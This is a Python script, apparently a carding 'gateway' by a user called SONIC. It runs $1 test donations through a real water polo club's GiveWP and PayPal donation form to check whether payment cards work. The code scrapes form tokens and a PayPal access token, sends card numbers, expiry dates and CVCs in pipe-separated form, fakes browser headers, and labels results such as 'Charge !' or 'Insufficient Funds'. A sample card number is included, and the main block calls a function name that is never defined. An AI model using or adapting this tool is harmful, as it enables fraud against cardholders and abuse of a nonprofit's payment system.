import requests, base64, re, time, random
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder

r = requests.Session()
user = generate_user_agent()

def charge1usd(ccx):
    """
    Gateway extracted from www.northidahowaterpolo.org
    Developed by: SONIC 🍀
    Amount: $1.00
    """
    ccx = ccx.strip()
    parts = ccx.split("|")
    n = parts[0].replace(" ", "")
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3].strip()
    
    if "20" in yy:
        yy = yy.split("20")[1]
    if len(yy) == 4:
        yy = yy[2:]
    
    headers = {
        'user-agent': user,
    }
    
    try:
        response = r.get('https://www.northidahowaterpolo.org/donations/donation-form/', cookies=r.cookies, headers=headers)
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        
        headers = {
            'origin': 'https://www.northidahowaterpolo.org',
            'referer': 'https://www.northidahowaterpolo.org/donations/donation-form/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://www.northidahowaterpolo.org/donations/donation-form/',
            'give-form-url': 'https://www.northidahowaterpolo.org/donations/donation-form/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'Sonic',
            'give_last': 'Bot',
            'give_email': 'sonic@bot.com',
            'card_name': 'Sonic',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
            'give-form-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
            'give-form-minimum': (None, '1.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': 'paypal-commerce',
            'give_first': (None, 'Sonic'),
            'give_last': (None, 'Bot'),
            'give_email': (None, 'sonic@bot.com'),
            'card_name': (None, 'Sonic'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': 'https://www.northidahowaterpolo.org',
            'referer': 'https://www.northidahowaterpolo.org/donations/donation-form/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {'action': 'give_paypal_commerce_create_order'}
        response = r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data)
        tok = response.json()["data"]["id"]
        
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers, json=json_data)
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
            'give-form-url': (None, 'https://www.northidahowaterpolo.org/donations/donation-form/'),
            'give-form-minimum': (None, '1.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': 'paypal-commerce',
            'give_first': 'Sonic',
            'give_last': 'Bot',
            'give_email': 'sonic@bot.com',
            'card_name': 'Sonic',
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': 'https://www.northidahowaterpolo.org',
            'referer': 'https://www.northidahowaterpolo.org/donations/donation-form/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
        response = r.post('https://www.northidahowaterpolo.org/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data)
        
        text = response.text
        if 'true' in text or 'sucsesss' in text:    
            return "Charge !"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "Insufficient Funds"
        elif 'ORDER_NOT_APPROVED' in text:
            return "ORDER_NOT_APPROVED"
        else:
            try:
                result = response.json()["data"]["error"]
                return result
            except:
                return "UNKNOWN_ERROR"
            
    except Exception as e:
        return f"Error: {str(e)[:50]}"

if __name__ == "__main__":
    print(gateway_www_northidahowaterpolo_org('4217834081794714|11|26|614'))
